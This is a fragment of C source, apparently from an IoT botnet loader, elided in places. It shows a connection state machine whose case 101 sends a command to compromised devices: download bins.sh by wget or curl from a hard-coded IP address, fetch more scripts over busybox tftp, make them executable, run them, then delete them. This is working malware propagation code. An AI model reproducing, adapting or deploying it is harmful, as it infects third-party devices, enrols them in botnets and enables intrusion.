...
void StartTheLelz()
{
	...
	while(1)
	{
		for(i = 0; i < max; i++)
		{
			...
			case 101:
                                {
                                        if(send(fds[i].fd, "cd /tmp; wget http://162.213.38.139/bins.sh || curl -O http://162.213.38.139/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 162.213.38.139 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 162.213.38.139; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh", 282, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 102;
                                }
                                break;
